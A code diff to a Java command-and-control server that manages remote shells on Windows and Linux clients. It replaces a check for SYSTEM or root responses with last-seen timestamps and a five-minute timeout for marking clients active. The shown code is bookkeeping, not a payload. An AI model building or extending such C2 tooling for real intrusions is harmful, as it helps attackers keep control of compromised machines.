@@ -7,6 +7,7 @@ import java.net.Socket;
 import java.net.SocketException;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
+import java.sql.Time;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Scanner;
@@ -28,6 +29,9 @@ public class C2Server implements Runnable{
     // Dictionaries to Map IP's to Client responses
     private HashMap<String,ArrayList<String>> windowsClientResponses;
     private HashMap<String,ArrayList<String>> linuxClientResponses;
+
+    // Dictionary to map IP Addresses to time last seen
+    private HashMap<String, Time> clientLastSeen;
 
     // Bionded Server Socket
     private ServerSocket serverSocket;
@@ -76,6 +80,7 @@ public class C2Server implements Runnable{
         this.passwordInputConsole = System.console();
         this.userInputScanner = new Scanner(System.in);
         this.userMessageList = new HashMap<>();
+        this.clientLastSeen = new HashMap<>();
     }
 
     /**
@@ -207,6 +212,7 @@ public class C2Server implements Runnable{
         } else if(OS.contains("Linux")){
             linuxClientResponses.put(IPAddress, new ArrayList<>());
         }
+        clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
     }
 
     public int getShellID(){
@@ -376,36 +382,21 @@ public class C2Server implements Runnable{
         // True if the client is still active, false if the client is no longer active.
         HashMap<String, Boolean> clientStatus = new HashMap<>();
 
-        for (String ip : windowsClientResponses.keySet()){
-            if (windowsClientResponses.get(ip).size() != 0){
-                if ((windowsClientResponses.get(ip).contains("nt authority\\system")) && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
-                    // If responses contains the string we just send a command to get, then remove it, and give it true
-                    ArrayList<String> tempList = windowsClientResponses.get(ip);
-                    tempList.remove("nt authority\\system");
-                    windowsClientResponses.put(ip, tempList);
-                    clientStatus.put(ip, true);
-                } else {
-                    clientStatus.put(ip, false);
-                }
-            }   
-        }
-
-        // Check all Linux Boxes
-        for (String ip : linuxClientResponses.keySet()){
-            if (linuxClientResponses.get(ip).size() != 0){
-                if (linuxClientResponses.get(ip).contains("root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
-                    // If responses contains the string we just send a command to get, then remove it, and give it true
-                    ArrayList<String> tempList = linuxClientResponses.get(ip);
-                    tempList.remove("root");
-                    linuxClientResponses.put(ip, tempList);
-                    clientStatus.put(ip, true);
-                } else {
-                    clientStatus.put(ip, false);
-                }
-            }   
+        for (String ip : clientLastSeen.keySet()){
+            long currentTime = System.currentTimeMillis();
+            long lastSeenTime = clientLastSeen.get(ip).getTime();
+            if((currentTime - lastSeenTime) < 300000){
+                clientStatus.put(ip, true);
+            } else {
+                clientStatus.put(ip, false);
+            }
         }
         
         return clientStatus;
+    }
+
+    protected void updateClientLastSeen(String IPAddress){
+        clientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
     }
     
     @Override
